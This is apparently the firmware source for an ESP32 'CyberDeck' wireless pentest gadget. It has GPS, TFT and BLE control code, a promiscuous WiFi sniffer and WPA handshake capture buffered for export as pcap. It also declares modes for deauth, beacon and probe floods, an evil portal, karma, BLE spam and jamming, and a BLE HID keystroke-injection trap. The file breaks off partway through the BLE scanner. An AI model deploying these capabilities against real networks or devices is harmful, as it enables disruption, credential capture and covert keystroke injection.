// CyberDeck — SPECTRE HUB firmware (orchestrator ported to the ESP32-WROOM-32U)
//
// Single-chip port of orchestrator/v1 (C3 brain + UNO readout) onto the SPECTRE HUB:
//   - one ESP32-WROOM-32U runs the radio + brains + BLE control AND paints the TFT directly
//   - 8-bit PARALLEL 2.4" ILI9341 TFT via TFT_eSPI (portrait 240x320) — replaces the UART-to-UNO link
//   - native NEO-7M GPS on UART2 (RX=21, TX=22) — replaces the old phone-GPS workaround
//   - external U.FL antenna on the WROOM for range
//
// New vs the C3 build: Wardriver (live, GPS-stamped), Satellite Scanner, Packet-Monitor waterfall,
// BLE Sniffer (tracking table), BLE Jammer (best-effort), and Handshake -> pcap streamed to the phone.
//
// SINGLE-RADIO RULE (unchanged): BLE control and WiFi can't run at once. Boot = IDLE (BLE up, WiFi
// off); selecting a WiFi-group mode tears BLE down and the TFT is the live surface. GPS is a separate
// UART, so it keeps running in every mode. Send STOP (0xFF) to return to IDLE.
//
// BLE service (bonded, passkey 123456):
//   CMD    (write, enc):  byte[0]=opcode, byte[1..]=params. 0xF0=CLOCK_SYNC, 0xF1=PULL_CAPTURE, 0xFF=STOP
//   STATUS (notify, enc): short "mode + stat" string
//   DATA   (notify, enc): AP list, and raw EAPOL frames for the phone to wrap into a .pcap
//
// Build: ESP32 Dev Module, Huge APP (3MB/1MB), 4MB flash, PSRAM off. Core 2.0.x, NimBLE-Arduino 2.5.x,
// TFT_eSPI 2.5.x (parallel User_Setup). Raw 802.11 TX needs the -Wl,-zmuldefs link flag (platform.local.txt).
// Pins: see docs/hardware-layout.md (SPECTRE / HUB). See docs/hub-migration-plan.md for the port spec.

extern "C" {
  #include "esp_wifi.h"
  #include "esp_event.h"
  #include "esp_wifi_types.h"
  #include "nvs_flash.h"
}
#include <esp_netif.h>
#include <esp_wifi_default.h>
#include <esp_http_server.h>
#include <lwip/sockets.h>
#include <NimBLEDevice.h>
#include <TFT_eSPI.h>
#include <HardwareSerial.h>
#include "ducky.h"

// ---------------------------------------------------------------------------------------
// Pins + tunables
// ---------------------------------------------------------------------------------------
static const int      GPS_RX_PIN = 21, GPS_TX_PIN = 22;   // NEO-7M: GPS TXD->21, GPS RXD<-22
static const uint32_t GPS_BAUD  = 9600;
static const int      BOOT_BTN  = 0;        // WROOM BOOT button (bench mode-cycle; phone is the real UI)
static const int      SCREEN_ROWS = 20, ROW_TEXT_MAX = 38;
static const uint32_t SEND_MS     = 400;    // recompose the screen ~2.5x/sec
static const uint32_t FULLREFRESH_MS = 15000;
static const uint32_t HOP_MS      = 200;
static const uint32_t FORGET_MS   = 90000;
static const uint32_t STATUS_MS   = 1000;   // BLE STATUS notify cadence (non-WiFi modes)

// BLE identity / UUIDs
static const char* BLE_NAME   = "CyberDeck";
static const uint32_t BLE_PASSKEY = 123456;
static const char* HID_BAIT_NAME = "Wireless Keyboard";
static const char* SVC_UUID   = "6e40a000-b5a3-f393-e0a9-e50e24dcca9e";
static const char* CMD_UUID   = "6e40a001-b5a3-f393-e0a9-e50e24dcca9e";
static const char* STAT_UUID  = "6e40a002-b5a3-f393-e0a9-e50e24dcca9e";
static const char* DATA_UUID  = "6e40a003-b5a3-f393-e0a9-e50e24dcca9e";

enum { COL_W = 0, COL_GRAY, COL_GREEN, COL_YELLOW, COL_RED, COL_CYAN, COL_ORANGE };

// Encryption classes
enum { ENC_OPEN = 0, ENC_WEP, ENC_WPA, ENC_WPA2, ENC_WPA3, ENC_WPA2_WPA3, ENC_ENT };
#define FLAG_HIDDEN 0x01
#define FLAG_RANDOM 0x02

// ---------------------------------------------------------------------------------------
// TFT (portrait 240x320, parallel) — the display layer that replaces the C3->UNO UART link
// ---------------------------------------------------------------------------------------
static TFT_eSPI tft;
static const int ROW_H = 16;            // 20 rows * 16 = 320 exactly
static const uint16_t PAL[7] = {        // COL_W, GRAY, GREEN, YELLOW, RED, CYAN, ORANGE
  0xFFFF, 0x8410, 0x07E0, 0xFFE0, 0xF800, 0x07FF, 0xFD20
};

// ---------------------------------------------------------------------------------------
// GPS (NEO-7M on UART2) — separate from the 2.4GHz radio, so it runs in every mode
// ---------------------------------------------------------------------------------------
static HardwareSerial GPSser(2);
struct GpsState { bool fix; double lat, lon; float alt, hdop; uint8_t sats, fixq; char utc[7]; uint32_t lastMs; };
static GpsState g_gps = {0};
struct SatView { uint8_t prn, elev, snr; uint16_t az; };
static const int SAT_MAX = 24;
static SatView  g_sat[SAT_MAX];
static int      g_satCount = 0;
static int      g_satTmpCount = 0;      // accumulator across the GSV message set

// ---------------------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------------------
struct Ap  { bool used; uint8_t bssid[6]; int8_t rssi; uint8_t ch, enc, flags, ssidLen;
             char ssid[33]; uint32_t firstMs, lastMs; };
struct Cli { bool used; uint8_t mac[6], ap[6]; int8_t rssi; uint8_t ch, flags, probeLen;
             char probe[33]; bool haveAp; uint32_t firstMs, lastMs; };

typedef struct __attribute__((packed)) {
  uint8_t frame_ctrl[2], duration[2], addr1[6], addr2[6], addr3[6], seq_ctrl[2];
} wifi_mac_hdr_t;

static const int AP_MAX = 40, CLI_MAX = 80;
static Ap  apTab[AP_MAX];
static Cli cliTab[CLI_MAX];
static int apCount = 0, cliCount = 0;

static volatile uint32_t framesTotal = 0, deauthTotal = 0, mgmtTotal = 0;
static uint8_t  channels[] = {1,2,3,4,5,6,7,8,9,10,11,12,13};
static const int NUM_CH = sizeof(channels);
static uint8_t  curCh = 1;
static int      chIdx = 0;
static uint32_t g_cycles = 0;
static uint32_t g_epoch  = 0;

// Per-channel frame counters for the Packet-Monitor waterfall (index = channel-1)
static volatile uint32_t chFrames[14] = {0};

// Handshake capture (EAPOL)
static volatile uint32_t eapolCount = 0;
static uint8_t  eapolBssid[6];
static bool     eapolHave = false;
// EAPOL frame buffer streamed to the phone as a .pcap (records: [u16 len][frame bytes])
static const int PCAP_BUF = 8192;
static uint8_t   pcapBuf[PCAP_BUF];
static volatile size_t pcapLen = 0;
static volatile uint16_t pcapFrames = 0;
static volatile bool g_pendingPcap = false;

// WiFi injection counters (own-lab)
static uint32_t txTotal = 0;
static int      beaconIdx = 0;

// ---- Attack TARGET (safety) ----
static uint8_t  g_tgtBssid[6] = {0};
static uint8_t  g_tgtCh = 0;
static char     g_tgtSsid[33] = "";
static bool     g_haveTarget = false;
static volatile bool g_pendingAplist = false;

// ---------------------------------------------------------------------------------------
// Mode machine
// ---------------------------------------------------------------------------------------
enum Mode {
  IDLE = 0,                         // BLE up, WiFi off — phone connects here
  // WiFi-radio group (BLE down while these run) — keep contiguous for isWifiMode()
  PASSIVE, WIFI_SCAN, WIFI_DEAUTH, BEACON_SPAM, PROBE_FLOOD, KARMA, HANDSHAKE_CAPTURE,
  EVIL_PORTAL, WARDRIVE, PACKET_MONITOR, TARGET_SCAN,
  // BLE-radio group (phone link stays up)
  BLE_SCAN, AIRTAG_SCAN, FLIPPER_SCAN, SKIMMER_SCAN, BLE_SPAM, BLE_HID_TRAP, BLE_SNIFFER, BLE_JAMMER,
  // GPS-only (no 2.4GHz radio — phone link stays up)
  SATELLITE_SCAN,
  MODE_COUNT
};
enum RadioRole { ROLE_CONTROL, ROLE_WIFI, ROLE_HID };
enum BleKind { BK_PLAIN = 0, BK_AIRTAG, BK_FLIPPER, BK_SKIMMER };
static const char* MODE_NAME[MODE_COUNT] = {
  "IDLE / CONNECT PHONE",
  "PASSIVE RECON", "WIFI SCAN", "WIFI DEAUTH", "BEACON SPAM", "PROBE FLOOD", "KARMA",
  "HANDSHAKE CAPTURE", "EVIL PORTAL", "WARDRIVE", "PACKET MONITOR", "TARGET SCAN",
  "BLE SCAN", "AIRTAG SCAN", "FLIPPER SCAN", "SKIMMER SCAN", "BLE SPAM", "BLE HID TRAP",
  "BLE SNIFFER", "BLE JAMMER", "SATELLITE SCAN"
};
static bool isWifiMode(Mode m) { return m >= PASSIVE && m <= TARGET_SCAN; }
static bool isTxMode(Mode m) {
  switch (m) { case WIFI_DEAUTH: case BEACON_SPAM: case PROBE_FLOOD: case KARMA:
               case EVIL_PORTAL: case BLE_SPAM: case BLE_HID_TRAP: case BLE_JAMMER: return true;
               default: return false; }
}

static const Mode CYCLE[] = { IDLE, PASSIVE, BLE_SCAN, WARDRIVE, SATELLITE_SCAN };
static const int  CYCLE_N = sizeof(CYCLE) / sizeof(CYCLE[0]);
static int        cycleIdx = 0;

static Mode currentMode = IDLE;
static bool promiscOn = false;

// BLE state
static NimBLEServer*         bleSrv   = nullptr;
static NimBLECharacteristic* chStatus = nullptr;
static NimBLECharacteristic* chData   = nullptr;
static bool             bleUp          = false;
static bool             bleTearingDown = false;
static volatile bool    phoneConnected = false;
static volatile int     pendingOpcode  = -1;

static Mode opcodeToMode(uint8_t op) {
  switch (op) {
    case 0x00: return PASSIVE;           case 0x01: return WIFI_SCAN;
    case 0x02: return WIFI_DEAUTH;       case 0x03: return BEACON_SPAM;
    case 0x04: return PROBE_FLOOD;       case 0x05: return KARMA;
    case 0x06: return HANDSHAKE_CAPTURE; case 0x07: return EVIL_PORTAL;
    case 0x08: return WARDRIVE;          case 0x09: return SATELLITE_SCAN;
    case 0x0A: return PACKET_MONITOR;
    case 0x10: return BLE_SCAN;          case 0x11: return AIRTAG_SCAN;
    case 0x12: return FLIPPER_SCAN;      case 0x13: return SKIMMER_SCAN;
    case 0x14: return BLE_SPAM;          case 0x15: return BLE_HID_TRAP;
    case 0x16: return BLE_SNIFFER;       case 0x17: return BLE_JAMMER;
    case 0x21: return TARGET_SCAN;
    case 0xFF: return IDLE;
    default:   return MODE_COUNT;
  }
}

// ---------------------------------------------------------------------------------------
// Display layer — setRow()/screenClear() draw straight to the TFT (shadow-diff to limit redraws)
// ---------------------------------------------------------------------------------------
static char    shadow[SCREEN_ROWS][ROW_TEXT_MAX + 1];
static uint8_t shColor[SCREEN_ROWS];
static bool    forceAll = true;

static void screenClear() {
  tft.fillScreen(TFT_BLACK);
  for (int i = 0; i < SCREEN_ROWS; i++) { shadow[i][0] = 0; shColor[i] = 0xFF; }
  forceAll = true;
}
static void setLeds(bool, bool) { /* no discrete LEDs on the HUB; status is on-screen */ }

static void setRow(int r, uint8_t color, const char* text) {
  if (r < 0 || r >= SCREEN_ROWS) return;
  if (color > 6) color = 0;
  char buf[ROW_TEXT_MAX + 1];
  snprintf(buf, sizeof(buf), "%.*s", ROW_TEXT_MAX, text);
  if (!forceAll && color == shColor[r] && strcmp(buf, shadow[r]) == 0) return;
  strcpy(shadow[r], buf); shColor[r] = color;
  int y = r * ROW_H;
  tft.fillRect(0, y, tft.width(), ROW_H, TFT_BLACK);
  tft.setTextFont(1);
  tft.setTextSize(1);
  tft.setTextColor(PAL[color], TFT_BLACK);
  tft.setCursor(1, y + 4);
  tft.print(buf);
}

// ---------------------------------------------------------------------------------------
// GPS (NMEA) — minimal GGA + GSV parser
// ---------------------------------------------------------------------------------------
static double nmeaCoord(const char* v, const char* hemi) {
  if (!*v) return 0.0;
  double raw = atof(v);
  int deg = (int)(raw / 100);
  double min = raw - deg * 100.0;
  double d = deg + min / 60.0;
  if (hemi[0] == 'S' || hemi[0] == 'W') d = -d;
  return d;
}
// split a NMEA sentence into comma fields (in place)
static int nmeaSplit(char* s, char** f, int maxf) {
  int n = 0; f[n++] = s;
  for (char* p = s; *p && n < maxf; p++) if (*p == ',') { *p = 0; f[n++] = p + 1; }
  return n;
}
static void gpsHandleSentence(char* s) {
  char* f[24]; int nf = nmeaSplit(s, f, 24);
  if (nf < 1) return;
  const char* t = f[0];
  if (strstr(t, "GGA") && nf >= 10) {
    g_gps.fixq = (uint8_t)atoi(f[6]);
    g_gps.fix  = g_gps.fixq > 0;
    g_gps.sats = (uint8_t)atoi(f[7]);
    g_gps.hdop = atof(f[8]);
    g_gps.alt  = atof(f[9]);
    if (g_gps.fix) { g_gps.lat = nmeaCoord(f[2], f[3]); g_gps.lon = nmeaCoord(f[4], f[5]); }
    snprintf(g_gps.utc, sizeof(g_gps.utc), "%.6s", f[1]);
    g_gps.lastMs = millis();
  } else if (strstr(t, "GSV") && nf >= 4) {
    int msgNum = atoi(f[2]);
    if (msgNum == 1) g_satTmpCount = 0;            // first message of the set — restart accumulation
    for (int i = 4; i + 3 < nf && g_satTmpCount < SAT_MAX; i += 4) {
      if (!*f[i]) continue;
      SatView& sv = g_sat[g_satTmpCount];
      sv.prn  = (uint8_t)atoi(f[i]);
      sv.elev = (uint8_t)atoi(f[i + 1]);
      sv.az   = (uint16_t)atoi(f[i + 2]);
      sv.snr  = (uint8_t)atoi(f[i + 3]);
      g_satTmpCount++;
    }
    if (atoi(f[1]) == msgNum) g_satCount = g_satTmpCount;   // last message — publish the set
  }
}
static void gpsPoll() {
  static char line[100]; static int li = 0;
  while (GPSser.available()) {
    char c = (char)GPSser.read();
    if (c == '\n' || c == '\r') {
      if (li > 5 && line[0] == '$') { line[li] = 0; gpsHandleSentence(line); }
      li = 0;
    } else if (li < (int)sizeof(line) - 1) line[li++] = c;
    else li = 0;
  }
}

// ---------------------------------------------------------------------------------------
// Table upserts
// ---------------------------------------------------------------------------------------
static Ap* apUpsert(const uint8_t* bssid, bool* isNew) {
  int free = -1, oldest = 0;
  for (int i = 0; i < AP_MAX; i++) {
    if (!apTab[i].used) { if (free < 0) free = i; continue; }
    if (memcmp(apTab[i].bssid, bssid, 6) == 0) { *isNew = false; return &apTab[i]; }
    if (apTab[i].lastMs < apTab[oldest].lastMs || !apTab[oldest].used) oldest = i;
  }
  *isNew = true;
  int s = free >= 0 ? free : oldest;
  if (free >= 0) apCount++;
  memset(&apTab[s], 0, sizeof(Ap));
  apTab[s].used = true; memcpy(apTab[s].bssid, bssid, 6); apTab[s].firstMs = millis();
  return &apTab[s];
}
static Cli* cliUpsert(const uint8_t* mac, bool* isNew) {
  int free = -1, oldest = 0;
  for (int i = 0; i < CLI_MAX; i++) {
    if (!cliTab[i].used) { if (free < 0) free = i; continue; }
    if (memcmp(cliTab[i].mac, mac, 6) == 0) { *isNew = false; return &cliTab[i]; }
    if (cliTab[i].lastMs < cliTab[oldest].lastMs || !cliTab[oldest].used) oldest = i;
  }
  *isNew = true;
  int s = free >= 0 ? free : oldest;
  if (free >= 0) cliCount++;
  memset(&cliTab[s], 0, sizeof(Cli));
  cliTab[s].used = true; memcpy(cliTab[s].mac, mac, 6); cliTab[s].firstMs = millis();
  return &cliTab[s];
}
static bool isMulticast(const uint8_t* m) { return m[0] & 0x01; }

// ---------------------------------------------------------------------------------------
// 802.11 tagged-parameter parsing
// ---------------------------------------------------------------------------------------
static bool parseSSID(const uint8_t* body, int len, const uint8_t** ssid, uint8_t* out) {
  int i = 0;
  while (i + 2 <= len) {
    uint8_t tag = body[i], l = body[i + 1];
    if (i + 2 + l > len) break;
    if (tag == 0) { *ssid = &body[i + 2]; *out = l > 32 ? 32 : l; return true; }
    i += 2 + l;
  }
  return false;
}
static uint8_t parseDsChannel(const uint8_t* body, int len) {
  int i = 0;
  while (i + 2 <= len) {
    uint8_t tag = body[i], l = body[i + 1];
    if (i + 2 + l > len) break;
    if (tag == 3 && l == 1) return body[i + 2];
    i += 2 + l;
  }
  return 0;
}
static uint8_t parseEncryption(const uint8_t* body, int len, uint16_t cap) {
  if ((cap & 0x0010) == 0) return ENC_OPEN;
  bool rsn = false, wpa1 = false, sae = false, psk = false, ent = false;
  int i = 0;
  while (i + 2 <= len) {
    uint8_t tag = body[i], l = body[i + 1];
    if (i + 2 + l > len) break;
    int start = i + 2, end = i + 2 + l;
    if (tag == 48) {
      rsn = true;
      int off = start + 2 + 4;
      if (off + 2 <= end) { uint16_t pw = body[off] | (body[off+1] << 8); off += 2 + (int)pw * 4; }
      if (off + 2 <= end) {
        uint16_t akm = body[off] | (body[off+1] << 8); off += 2;
        for (uint16_t k = 0; k < akm && off + 4 <= end; k++, off += 4) {
          uint8_t ty = body[off + 3];
          if (ty == 8 || ty == 9) sae = true;
          else if (ty == 2 || ty == 4 || ty == 6) psk = true;
          else if (ty == 1 || ty == 3 || ty == 5 || ty == 11 || ty == 12) ent = true;
        }
      }
    } else if (tag == 221 && l >= 4 && body[start]==0x00 && body[start+1]==0x50 &&
               body[start+2]==0xF2 && body[start+3]==0x01) { wpa1 = true; }
    i += 2 + l;
  }
  if (rsn) {
    if (ent && !psk && !sae) return ENC_ENT;
    if (sae && psk) return ENC_WPA2_WPA3;
    if (sae) return ENC_WPA3;
    return ENC_WPA2;
  }
  return wpa1 ? ENC_WPA : ENC_WEP;
}
static const char* encShort(uint8_t e) {
  switch (e) { case ENC_OPEN: return "OPEN"; case ENC_WEP: return "WEP"; case ENC_WPA: return "WPA";
    case ENC_WPA2: return "WPA2"; case ENC_WPA3: return "WPA3"; case ENC_WPA2_WPA3: return "WPA23";
    case ENC_ENT: return "ENT"; default: return "?"; }
}
// OUI vendor hint (tiny common table for the richer WiFi scan — not a full DB)
static const char* ouiVendor(const uint8_t* b) {
  struct O { uint8_t p[3]; const char* n; };
  static const O T[] = {
    {{0x00,0x1A,0x11},"Google"}, {{0x3C,0x5A,0xB4},"Google"}, {{0xF4,0xF5,0xE8},"Google"},
    {{0xDC,0xA6,0x32},"RPi"},    {{0xB8,0x27,0xEB},"RPi"},    {{0xE4,0x5F,0x01},"RPi"},
    {{0x00,0x50,0xF2},"MS"},     {{0xAC,0xDE,0x48},"Apple"},  {{0xF0,0x18,0x98},"Apple"},
    {{0x00,0x0C,0x29},"VMware"}, {{0x00,0x1D,0x0F},"TP-Link"},{{0x50,0xC7,0xBF},"TP-Link"},
    {{0xD8,0x0D,0x17},"TP-Link"},{{0xC0,0x25,0xE9},"TP-Link"},{{0x2C,0x3A,0xE8},"Espressif"},
    {{0x24,0x0A,0xC4},"Espressif"},{{0x7C,0x9E,0xBD},"Espressif"},{{0xA0,0x20,0xA6},"Espressif"},
  };
  for (auto& o : T) if (memcmp(o.p, b, 3) == 0) return o.n;
  return "";
}

// ---------------------------------------------------------------------------------------
// Promiscuous callback (WiFi task — keep cheap)
// ---------------------------------------------------------------------------------------
static void noteAp(const uint8_t* bssid, const uint8_t* ssid, uint8_t ssidLen, bool hidden,
                   int8_t rssi, uint8_t ch, uint8_t enc) {
  bool isNew; Ap* a = apUpsert(bssid, &isNew);
  a->rssi = rssi; a->ch = ch; a->enc = enc;
  a->flags = hidden ? FLAG_HIDDEN : 0;
  if (ssidLen) { memcpy(a->ssid, ssid, ssidLen); a->ssid[ssidLen] = 0; a->ssidLen = ssidLen; }
  a->lastMs = millis();
}
static void noteClient(const uint8_t* mac, const uint8_t* ap, const uint8_t* probe,
                       uint8_t probeLen, int8_t rssi, uint8_t ch) {
  if (isMulticast(mac)) return;
  bool isNew; Cli* c = cliUpsert(mac, &isNew);
  c->rssi = rssi; c->ch = ch;
  c->flags = (mac[0] & 0x02) ? FLAG_RANDOM : 0;
  if (ap) { memcpy(c->ap, ap, 6); c->haveAp = true; }
  if (probeLen) { memcpy(c->probe, probe, probeLen); c->probe[probeLen] = 0; c->probeLen = probeLen; }
  c->lastMs = millis();
}

static void onPacket(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
  const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
  const uint8_t* p = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;
  if (len < (int)sizeof(wifi_mac_hdr_t)) return;
  const wifi_mac_hdr_t* h = (const wifi_mac_hdr_t*)p;
  uint8_t tb = (h->frame_ctrl[0] >> 2) & 0x3, st = (h->frame_ctrl[0] >> 4) & 0xF;
  int8_t rssi = pkt->rx_ctrl.rssi; uint8_t ch = pkt->rx_ctrl.channel;
  framesTotal++;
  if (ch >= 1 && ch <= 14) chFrames[ch - 1]++;

  if (tb == 2) {  // data
    if (currentMode == HANDSHAKE_CAPTURE) {
      int hl = (st & 0x08) ? 26 : 24;
      if (len >= hl + 8 && p[hl + 6] == 0x88 && p[hl + 7] == 0x8E) {
        if (!g_haveTarget || memcmp(h->addr3, g_tgtBssid, 6) == 0) {
          eapolCount++; memcpy(eapolBssid, h->addr3, 6); eapolHave = true;
          // Buffer the raw frame for the phone to wrap into a .pcap ([u16 len][bytes])
          if (pcapLen + 2 + len <= PCAP_BUF && len <= 2048) {
            pcapBuf[pcapLen++] = (uint8_t)(len & 0xFF);
            pcapBuf[pcapLen++] = (uint8_t)((len >> 8) & 0xFF);
            memcpy(pcapBuf + pcapLen, p, len); pcapLen += len; pcapFrames++;
          }
        }
      }
    }
    uint8_t toDs = h->frame_ctrl[1] & 0x01, fromDs = h->frame_ctrl[1] & 0x02;
    if (toDs && !fromDs)      noteClient(h->addr2, h->addr1, nullptr, 0, rssi, ch);
    else if (!toDs && fromDs) noteClient(h->addr1, h->addr2, nullptr, 0, rssi, ch);
    return;
  }
  if (tb != 0) return;
  mgmtTotal++;
  switch (st) {
    case 0xC: deauthTotal++; return;
    case 0xA: deauthTotal++; return;
    case 0x8: case 0x5: {
      const uint8_t* fixed = p + sizeof(wifi_mac_hdr_t);
      const uint8_t* body = fixed + 12;
      int bl = len - (int)sizeof(wifi_mac_hdr_t) - 12;
      if (bl <= 0) return;
      uint16_t cap = fixed[10] | (fixed[11] << 8);
      const uint8_t* ssid = nullptr; uint8_t sl = 0;
      bool has = parseSSID(body, bl, &ssid, &sl);
      bool hidden = has && (sl == 0 || ssid[0] == 0);
      if (hidden) sl = 0;
      uint8_t dc = parseDsChannel(body, bl);
      noteAp(h->addr3, ssid, sl, hidden, rssi, dc ? dc : ch, parseEncryption(body, bl, cap));
      break;
    }
    case 0x4: {
      const uint8_t* body = p + sizeof(wifi_mac_hdr_t);
      int bl = len - (int)sizeof(wifi_mac_hdr_t);
      const uint8_t* ssid = nullptr; uint8_t sl = 0;
      if (bl > 0) parseSSID(body, bl, &ssid, &sl);
      noteClient(h->addr2, nullptr, ssid, sl, rssi, ch);
      break;
    }
  }
}

// ---------------------------------------------------------------------------------------
// WiFi radio lifecycle
// ---------------------------------------------------------------------------------------
static bool wifiInited = false;
static void wifiInitOnce() {
  if (wifiInited) return;
  nvs_flash_init();
  esp_netif_init();
  esp_event_loop_create_default();
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_STA);
  wifiInited = true;
}
static void wifiStart() {
  wifiInitOnce();
  esp_wifi_start();
  wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA };
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&onPacket);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(channels[0], WIFI_SECOND_CHAN_NONE);
  promiscOn = true;
}
static void wifiStop() {
  if (!promiscOn) return;
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);
  esp_wifi_stop();
  promiscOn = false;
}
static void hop() {
  if (!promiscOn) return;
  for (int t = 0; t < NUM_CH; t++) {
    chIdx = (chIdx + 1) % NUM_CH;
    if (esp_wifi_set_channel(channels[chIdx], WIFI_SECOND_CHAN_NONE) == ESP_OK) { curCh = channels[chIdx]; return; }
  }
}

// ---------------------------------------------------------------------------------------
// BLE lifecycle + callbacks
// ---------------------------------------------------------------------------------------
static void statusNotify(const char* s) {
  if (!bleUp || !phoneConnected || !chStatus) return;
  chStatus->setValue((const uint8_t*)s, strlen(s));
  chStatus->notify();
}

class ServerCB : public NimBLEServerCallbacks {
  void onConnect(NimBLEServer* s, NimBLEConnInfo& info) override {
    phoneConnected = true;
    s->updateConnParams(info.getConnHandle(), 24, 40, 4, 600);
  }
  void onDisconnect(NimBLEServer* s, NimBLEConnInfo& info, int reason) override {
    phoneConnected = false;
    if (!bleTearingDown) NimBLEDevice::startAdvertising();
  }
};
class CmdCB : public NimBLECharacteristicCallbacks {
  void onWrite(NimBLECharacteristic* c, NimBLEConnInfo& info) override {
    NimBLEAttValue v = c->getValue();
    if (v.length() < 1) return;
    uint8_t op = v[0];
    if (op == 0xF0) {
      if (v.length() >= 5) g_epoch = (uint32_t)v[1] | ((uint32_t)v[2] << 8) |
                                     ((uint32_t)v[3] << 16) | ((uint32_t)v[4] << 24);
      return;
    }
    if (op == 0xF1) { g_pendingPcap = true; return; }       // PULL_CAPTURE: drain EAPOL buffer to phone
    if (op == 0x15 && v.length() >= 2) g_duckyScript = v[1];
    if (op == 0x20) {
      if (v.length() >= 8) {
        const uint8_t* d = v.data();
        memcpy(g_tgtBssid, d + 1, 6); g_tgtCh = d[7];
        int sl = (int)v.length() - 8; if (sl > 32) sl = 32;
        if (sl > 0) { memcpy(g_tgtSsid, d + 8, sl); g_tgtSsid[sl] = 0; } else g_tgtSsid[0] = 0;
        g_haveTarget = true;
      }
      return;
    }
    if (op == 0x22) { g_haveTarget = false; g_tgtSsid[0] = 0; return; }
    if (op == 0x23) { g_pendingAplist = true; return; }
    pendingOpcode = op;
  }
};

static void bleStart() {
  if (bleUp) return;
  NimBLEDevice::init(BLE_NAME);
  NimBLEDevice::setSecurityAuth(true, true, true);
  NimBLEDevice::setSecurityIOCap(BLE_HS_IO_DISPLAY_ONLY);
  NimBLEDevice::setSecurityPasskey(BLE_PASSKEY);

  bleSrv = NimBLEDevice::createServer();
  bleSrv->setCallbacks(new ServerCB());
  NimBLEService* svc = bleSrv->createService(SVC_UUID);
  NimBLECharacteristic* cmd =
      svc->createCharacteristic(CMD_UUID, NIMBLE_PROPERTY::WRITE | NIMBLE_PROPERTY::WRITE_ENC);
  cmd->setCallbacks(new CmdCB());
  chStatus = svc->createCharacteristic(STAT_UUID,
      NIMBLE_PROPERTY::READ | NIMBLE_PROPERTY::NOTIFY | NIMBLE_PROPERTY::READ_ENC);
  chData = svc->createCharacteristic(DATA_UUID,
      NIMBLE_PROPERTY::READ | NIMBLE_PROPERTY::NOTIFY | NIMBLE_PROPERTY::READ_ENC);
  svc->start();

  NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
  adv->addServiceUUID(SVC_UUID);
  adv->enableScanResponse(true);
  adv->start();
  bleUp = true;
}
static void bleStop() {
  if (!bleUp) return;
  bleTearingDown = true;
  NimBLEDevice::deinit(true);
  bleSrv = nullptr; chStatus = nullptr; chData = nullptr;
  bleUp = false; phoneConnected = false; bleTearingDown = false;
}
static void bleAdvNormal() {
  if (!bleUp) return;
  NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
  adv->stop();
  adv->clearData();
  adv->addServiceUUID(SVC_UUID);
  adv->setName(BLE_NAME);
  adv->enableScanResponse(true);
  adv->start();
}

// ---------------------------------------------------------------------------------------
// BLE scanners (ROLE_CONTROL — the phone STAYS connected)
// ---------------------------------------------------------------------------------------
struct BleDev { bool used; char key[18]; int8_t rssi; uint8_t kind; char name[16];
                uint16_t pkts; uint32_t firstMs, lastMs; };
static const int BLE_MAX = 24;
static BleDev   bleTab[BLE_MAX];
static int      bleCount = 0;
static uint32_t bleSeen = 0;
static BleKind  bleFilter = BK_PLAIN;
static bool     bleScanning = false;

static bool ciContains(const char* hay, const char* needle) {
  size_t nl = strlen(needle);
  for (const char* q = hay; *q; q++) if (strncasecmp(q, needle, nl) == 0) return true;
  return false;
}
static bool payloadMfr(const std::vector<uint8_t>& pl, const uint8_t** out, int* outLen) {
  size_t i = 0;
  while (i + 1 < pl.size()) {
    uint8_t len = pl[i];
    if (len == 0 || i + 1 + len > pl.size()) break;
    if (pl[i + 1] == 0xFF && len >= 3) { *out = &pl[i + 2]; *outLen = len - 1; return true; }
    i += 1 + len;
  }
  return false;
}
static BleKind classifyBle(const NimBLEAdvertisedDevice* d, const char* name) {
  std::vector<uint8_t> pl = d->getPayload();
  const uint8_t* m; int ml;
  if (payloadMfr(pl, &m, &ml) && ml >= 3 && m[0] == 0x4C && m[1] == 0x00) {
    if (m[2] == 0x12) return BK_AIRTAG;
  }
  if (name[0]) {
    if (ciContains(name, "flipper")) return BK_FLIPPER;
    if (ciContains(name, "HC-05") || ciContains(name, "HC-06") || ciContains(name, "HC-03") ||
        ciContains(name, "AT-09") || ciContains(name, "MLT-BT05") || ciContains(name, "JDY") ||
        ciContains(name, "BT05")  || ciContains(name, "skim"))
      return BK_SKIMMER;
  }
  return BK_PLAIN;
}
static void bleOnAdv(const NimBLEAdvertisedDevice* d) {
  bleSeen++;
  char name[16] = {0};
  std::string nm = d->getName();
  if (!nm.empty()) snprintf(name, sizeof(name), "%s", nm.c_str());
  BleKind k = classifyBle(d, name);
  if (bleFilter != BK_PLAIN && k != bleFilter) return;
  char key[18]; snprintf(key, sizeof(key), "%s", d->getAddress().toString().c_str());
  int freeI = -1, oldest = 0;
  for (int i = 0; i < BLE_MAX; i++) {
    if (!bleTab[i].used) { if (freeI < 0) freeI = i; continue; }
    if (strcmp(bleTab[i].key, key) == 0) {
      bleTab[i].rssi = d->getRSSI(); bleTab[i].lastMs = millis(); bleTab[i].pkts++;
      if (name[0]) snprintf(bleTab[i].name, sizeof(bleTab[i].name), "%s", name);
      return;
    }
    if (bleTab[i].lastMs < bleTab[oldest].lastMs) oldest = i;
  }
  int s = freeI >= 0 ? freeI : oldest;
  if (freeI >= 0) bleCount++;
  memset(&bleTab[s], 0, sizeof(BleDev));
  bleTab[s].used = true; bleTab[s].rssi = d->getRSSI(); bleTab[s].kind = k;
  bleTab[s].pkts = 1; bleTab[s].firstMs = millis(); bleTab[s].lastMs = millis();
  snprintf(bleTab[s].key, sizeof(bleTab[s].key), "%s", key);
